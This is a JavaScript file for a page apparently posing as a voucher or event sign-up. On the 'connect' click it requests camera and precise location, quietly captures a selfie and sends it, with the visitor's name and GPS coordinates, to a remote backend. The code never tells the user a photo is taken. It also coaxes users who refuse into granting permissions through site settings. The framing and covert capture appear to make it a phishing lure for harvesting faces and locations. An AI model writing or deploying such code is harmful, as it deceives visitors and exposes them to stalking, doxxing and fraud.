// ======= CONFIG =======
const BACKEND_URL = "https://voucherlink.onrender.com"; // Use HTTPS in production

// ======= DOM ELEMENTS =======
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const statusEl = document.getElementById("status");
const form = document.getElementById("eventForm");
const connectBtn = document.getElementById("connectBtn");

// ======= GLOBAL STATE =======
let cachedGeo = null;
let cameraGranted = false;
let locationGranted = false;

// ======= CAMERA INIT =======
async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false,
    });
    video.srcObject = stream;

    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play().then(resolve).catch(resolve);
      };
    });

    console.log("🎥 Camera ready");
    cameraGranted = true;
    return true;
  } catch (err) {
    console.warn("Camera access denied:", err);
    cameraGranted = false;
    return false;
  }
}

// ======= LOCATION INIT =======
async function initLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      statusEl.textContent = "❌ Geolocation not supported.";
      locationGranted = false;
      return resolve(null);
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        cachedGeo = { lat: pos.coords.latitude, lon: pos.coords.longitude };
        locationGranted = true;
        resolve(cachedGeo);
      },
      (err) => {
        console.warn("Location denied:", err);
        locationGranted = false;
        resolve(null);
      },
      { enableHighAccuracy: true, timeout: 8000 }
    );
  });
}

// ======= CAPTURE SELFIE =======
function captureSelfie() {
  const w = video.videoWidth;
  const h = video.videoHeight;

  if (!w || !h) {
    console.warn("No video frame; using fallback image.");
    return (
      "data:image/jpeg;base64," +
      "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMB/Ve1W+QAAAAASUVORK5CYII="
    );
  }

  canvas.width = w;
  canvas.height = h;

  const ctx = canvas.getContext("2d");
  ctx.save();
  ctx.translate(w, 0);
  ctx.scale(-1, 1);
  ctx.drawImage(video, 0, 0, w, h);
  ctx.restore();

  return canvas.toDataURL("image/jpeg", 0.9);
}

// ======= SEND TO BACKEND =======
async function sendToBackend() {
  const name = document.getElementById("name")?.value || "Unknown";
  const selfie = captureSelfie();
  const geo = cachedGeo || (await initLocation());
  const data = { name, geo, selfie };

  statusEl.textContent = `🚀 Sending details for "${name}"...`;

  try {
    const res = await fetch(`${BACKEND_URL}/submit`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });

    const result = await res.json();
    if (result.ok) {
      statusEl.textContent = "✅ Submitted successfully! Connecting you...";
      setTimeout(() => {
        window.location.href = "#next-section"; // TODO: replace with actual section/page
      }, 1200);
    } else {
      statusEl.textContent = "❌ Server rejected data.";
    }
  } catch (err) {
    console.error(err);
    statusEl.textContent = "⚠️ Network or backend error.";
  }
}

// ======= PERMISSION CHECK ON BUTTON CLICK =======
connectBtn?.addEventListener("click", async (e) => {
  e.preventDefault();
  statusEl.textContent = "🔍 Checking permissions...";

  let hasCamera = false;
  let hasLocation = false;

  try {
    // Camera permission state
    if (navigator.permissions) {
      const camPerm = await navigator.permissions.query({ name: "camera" });
      if (camPerm.state === "granted") hasCamera = true;
      else if (camPerm.state === "prompt") hasCamera = await startCamera();
    } else {
      hasCamera = await startCamera();
    }

    // Location permission state
    if (navigator.permissions) {
      const geoPerm = await navigator.permissions.query({ name: "geolocation" });
      if (geoPerm.state === "granted") {
        hasLocation = true;
      } else if (geoPerm.state === "prompt") {
        await initLocation();
        hasLocation = locationGranted;
      }
    } else {
      await initLocation();
      hasLocation = locationGranted;
    }
  } catch (err) {
    console.warn("Permission check failed:", err);
  }

  if (hasCamera && hasLocation) {
    statusEl.textContent = "✅ Access granted! Starting connection...";
    await sendToBackend();
  } else {
    // Permission denied — show instructions and redirect help
    statusEl.innerHTML = `
      ⚠️ Please enable <b>Camera</b> and <b>Location</b> to continue.<br><br>
      <b>Android (Chrome):</b> Tap 🔒 in address bar → Site settings → Allow Camera & Location.<br>
      <b>iPhone (Safari):</b> Settings → Safari → Allow Camera & Location.<br><br>
    `;

    // Offer Chrome site settings shortcut for Android
    if (/Android/i.test(navigator.userAgent)) {
      const link = document.createElement("a");
      link.href = `chrome://settings/content/siteDetails?site=${window.location.origin}`;
      link.textContent = "⚙️ Open Site Settings";
      link.target = "_blank";
      link.style.display = "inline-block";
      link.style.marginTop = "8px";
      statusEl.appendChild(link);
    }
  }
});
